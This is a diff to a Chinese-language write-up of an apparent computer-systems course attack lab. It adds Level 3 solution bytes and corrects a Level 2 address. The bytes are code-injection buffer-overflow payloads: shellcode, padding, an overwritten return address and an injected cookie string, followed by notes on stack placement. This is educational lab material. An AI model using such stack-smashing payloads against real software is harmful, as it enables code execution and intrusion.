@@ -12,9 +12,9 @@ c0 17 40 00 00 00 00 00
 
 ### Level 2
 
-```
+```c
 48 c7 c7 fa 97 b9 59  /* mov $0x59b997fa, %rdi */
-68 ec 17 40 00        /* pushq  $0x4017e */
+68 ec 17 40 00        /* pushq  $0x4017ec */
 c3                    /* retq */
 /* byte code = 13 bytes */
 
@@ -26,3 +26,22 @@ c3                    /* retq */
 
 和Level1一样hack返回地址，这次跳回输入缓冲区的头部，这里放一段inject code。需要把待传参的参数放在rdi寄存器里，然后push一个`touch2`的返回地址并`ret`。
 
+### Level3
+
+```c
+48 c7 c7 a8 dc 61 55  /* mov $0x5561dca8, %rdi */
+68 fa 18 40 00        /* pushq  $0x4018fa */
+c3                    /* retq */
+/* byte code = 13 bytes */
+
+01 02 03 04 05 06 07 08 09 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27
+/* 27 dummy bytes */
+
+78 dc 61 55 00 00 00 00
+/* return address */
+
+35 39 62 39 39 37 66 61 00
+/* injected string */
+```
+
+需要把cookie的字符串摆在某个内存位置中。如果摆在return address之前，相当于位于`getbuf`的栈帧中，这部分一定会被`hexmatch`的栈帧覆盖掉（该函数申请了大数组）。所以必须把这部分字符串摆在返回地址之后，即`test`的栈帧中。
